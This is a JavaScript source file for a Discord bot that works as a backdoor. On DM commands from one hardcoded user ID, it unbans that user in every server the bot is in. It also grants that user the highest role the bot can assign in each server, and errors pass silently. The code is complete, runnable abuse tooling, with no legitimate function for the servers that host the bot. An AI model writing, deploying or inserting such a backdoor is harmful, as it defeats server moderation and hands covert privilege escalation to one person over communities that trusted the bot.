const {
  Client,
  GatewayIntentBits,
  Partials,
  ChannelType,
  PermissionsBitField
} = require("discord.js");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent
  ],
  partials: [Partials.Channel]
});

// YOUR USER ID (only you can use the commands)
const OWNER_ID = "1407805121722712144";

client.once("ready", () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
});

client.on("messageCreate", async (message) => {
  // Ignore bots
  if (message.author.bot) return;

  // DM only
  if (message.channel.type !== ChannelType.DM) return;

  // Only allow you
  if (message.author.id !== OWNER_ID) return;

  if (message.content === ".unban") {
    await unbanEverywhere(message);
  }

  if (message.content === ".role") {
    await giveRoleEverywhere(message);
  }
});

async function unbanEverywhere(message) {
  let count = 0;

  for (const guild of client.guilds.cache.values()) {
    try {
      if (!guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers))
        continue;

      const bans = await guild.bans.fetch();
      if (!bans.has(OWNER_ID)) continue;

      await guild.members.unban(OWNER_ID);
      count++;
    } catch (err) {
      // Missing permissions or hierarchy
    }
  }

  message.reply(`✅ Unbanned in **${count}** server(s).`);
}

async function giveRoleEverywhere(message) {
  let count = 0;

  for (const guild of client.guilds.cache.values()) {
    try {
      const botMember = await guild.members.fetch(client.user.id);
      const member = await guild.members.fetch(OWNER_ID);

      if (!botMember.permissions.has(PermissionsBitField.Flags.ManageRoles))
        continue;

      // Highest role bot can give
      const role = guild.roles.cache
        .filter(role =>
          role.editable &&
          !role.managed &&
          role.id !== guild.id
        )
        .sort((a, b) => b.position - a.position)
        .first();

      if (!role) continue;

      if (!member.roles.cache.has(role.id)) {
        await member.roles.add(role);
        count++;
      }
    } catch (err) {
      // Missing perms / role hierarchy
    }
  }

  message.reply(`✅ Role added in **${count}** server(s).`);
}

// 🔑 PUT YOUR BOT TOKEN HERE
client.login(process.env.BOT_TOKEN);
